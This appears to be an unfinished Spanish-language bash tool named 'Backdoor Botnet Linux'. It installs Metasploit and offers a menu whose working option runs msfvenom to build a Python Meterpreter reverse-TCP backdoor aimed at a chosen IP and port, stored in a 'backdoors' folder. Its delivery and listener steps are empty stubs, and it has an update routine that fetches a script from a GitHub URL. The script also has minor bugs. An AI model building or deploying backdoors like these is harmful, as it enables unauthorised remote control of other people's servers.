#!/bin/bash


#Colores para decorar

blanco="\033[1;37m"
violeta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
violeta2="\033[0;35m"
azul="\033[1;34m"
nc="\e[0m"



function ctrl_c() {

echo -e "$purple(*)$blue Presionaste la tecla$red CTRL + C$blue Saliendo del programa.."
sleep 2
echo -e "$purple(*)$blue Gracias por usar mi Script by$red Facu Salgado$nc"
sleep 1
exit

}



#VERIFICA EL DIRECTORIO
directory=$(pwd)


if [ -d "$directory/backdoors" ]
then
  sleep 0.25
else
   mkdir backdoors
fi

if [ -d "$directory/escucha" ]
then
  sleep 0.25
else
   mkdir escucha
fi


if [ -d "$directory/template" ]
then
  sleep 0.25
else
   mkdir template
fi


#aseguramos q la persona ejecute el archivo con privilegios Root

if [[ $EUID -ne 0 ]]; then	

echo -e "$nc($violeta2*$nc)$rojo ERROR:$azul nesesitas ser usuario$green root"		
exit 1
fi

echo -e "$azul(*)$verde chequeando dependencias"

if which msfconsole >/dev/null; then 
sleep 0.25
echo -e "$azul(metasploit)$verde Instalado correctamente."
else
sleep 1
echo -e "$azul(metasploit)$verde no Instalado"
sleep 2
echo -e "$green iniciando instalaccion por favor aguarde$nc"
sleep 5
apt-get install curl -y &> /dev/null
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

echo -e "$azul(python)$verde Instalado correctamente.$nc"
sleep 2
fi




if which python >/dev/null; then 
sleep 0.25
echo -e "$azul(python)$verde Instalado correctamente."
else
sleep 1
echo -e "$azul(python)$verde no Instalado"
sleep 2
echo -e "$azul(Actualizando repositorios) en 5 segundos$nc"
sleep 5
echo -e "$green actualizacion iniciada por favor esperar...$nc"
apt-get install update -y &> /dev/null
apt-get install upgrade -y &> /dev/null
apt-get install python -y &> /dev/null
apt-get install python3 -y &> /dev/null
echo -e "$azul(python)$verde Instalado correctamente."
sleep 2
fi

if which toilet >/dev/null; then 
sleep 0.25
echo -e "$azul(toilet)$verde Instalado correctamente."
else
echo -e "$azul(toilet)$rojo no Instalado$nc"
sleep 1
echo -e "$azul(toilet)$verde iniciando instalacion.. por favor esperar..$nc"
sleep 1
apt-get install update -y
apt-get install toilet -y &> /dev/null
apt-get install ruby -y &> /dev/null
gem install lolcat &> /dev/null
echo -e "$azul(toilet)$verde Instalado correctamente."
sleep 2
fi
if which wget >/dev/null; then 
sleep 0.25
echo -e "$azul(wget)$verde esta instalado."
else
sleep 0.25
echo -e "$azul(wget)$rojo no Instalado$nc"
sleep 1
echo -e "$azul(wget)$green iniciando instalacion.. por favor esperar...$nc"
sleep 1
apt-get install wget -y &> /dev/null
echo -e "$azul(wget)$verde Instalado correctamente."
sleep 2
fi
echo
echo -e "$azul(*)$verde Dependencias completas.... $azul actualizando repositorios por favor espera.."
sleep 3
apt-get update -y &> /dev/null
echo -e "$azul(*)$verde Iniciando programa en 5 segundos....$nc"
sleep 5


#Opciones menu

a=$'\e[1;35mPaso 1 - Crear Backdoor Raiz\e[01;32m'
b=$'\e[1;35mPaso 2 - Crear Script automatico para enviar el backdoor\e[01;32m'
update=$'\e[1;35mPaso 3 - Crear Archivo de escucha\e[01;32m'
c=$'\e[1;35mSalir del Programa\e[01;32m'


cloundyes=$'\e[1;35mMover a Nuestra Clound Propia\e[01;32m'
cloundno=$'\e[1;35mNo gracias lo movere a mi servidor privado\e[01;32m'

#mensaje y logo bienvenida
clear
toilet --filter border Backdoor Botnet Linux | lolcat
echo
echo -e "$violeta2(*)$azul Backdoor Bootnet linux$rojo v1.0$azul"
sleep 2
echo -e "$violeta2(*)$azul Script creado por$rojo Facu Salgado"
sleep 1
echo -e "$violeta2(*)$azul Regalanos una estrella en github$verde"

export PS3=$'\e[01;35m(*)\e[01;32m Elige una Opcion:\e[01;33m '



#menu principal

function menu_principal(){
echo
echo
select menu in "$a" "$b" "$update" "$c";
do
case $menu in
$a)
echo -e "$purple(*)$blue Esta opcion creara el backdoor para servidores linux"
sleep  2
echo -e "$blue"
read -p "EScriba su IP(local o publica): " ip
read -p "EScriba el puerto (Default 4444): " port
read -p "EScriba el nombre de su payload(sin extensiones) " name
sleep 2
echo -e "$purple(*)$blue El payload sera creado a la IP:$red $ip$blue En el puerto:$red $port"
sleep 1
echo -e "$purple(*)$blue Espere un momento por favor"
sleep 2

msfvenom -p python/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -O $directory/backdoors/$name.py
echo -e "$purple(*)$blue Archivo creado$red Aguarde por favor.."
sleep 3
echo -e "$purple(*)$blue Archivo creado... se guardo en la carpeta $green backdoors"
sleep 2
echo -e "$purple(*)$blue Desea mover el backdoor a un servidor propio o a nuestra Clound Propia?"
sleep 2
echo

#Pregunta si mueve el backdoor a nuestro servidor o lo colocaras en tu servidor propio para su posterior descarga
select afirmar in "$cloundyes" "$cloundno";
do
case $afirmar in
$cloundyes)

;;

$cloundno)

;;

*)
echo -e "$red(Error)$blue Opcion no valida$green"
;;
esac
done











;;
#FIN OPCION A MENU PRINCIPAL

$b)

;;
#FIN OPCION B MENU PRINCIPAL



$update)
echo -e "$nc($azul*$nc)$verde Comprobando estado internet.. please wait.."
sleep 4
if ping -q -w 1 -c 1 google.com > /dev/null; then
echo -e "$nc($azul*$nc)$verde Actualizando programa.. en 5 segundos.."
sleep 5 
if [ -e $directory/test.sh ]
then
rm $directory/test.sh
fi
curl https://raw.githubusercontent.com/facu017/asd/test.sh > test.sh
echo -e "$nc($azul*$nc)$verde Programa Actualizado.. vuelva a ejecutarlo nuevamente..$nc"
sleep 2
exit                                                                                                                                                                
else 
echo
echo
echo -e "$nc($azul*$nc)$verde Internet no disponible.. saliendo..$nc" 
exit                                                                                                                                                              
fi       
;;
#FIN OPCION UPDATE MENU PRINCIPAL


$c)

;;
#FIN OPCION C  (ultima opcion) MENU PRINCIPAL

*)


echo -e "$red(Error)$blue Opcion no valida$green"
;;
esac
done
}
#fin menu principal

menu_principal #llamada a la funcion menu



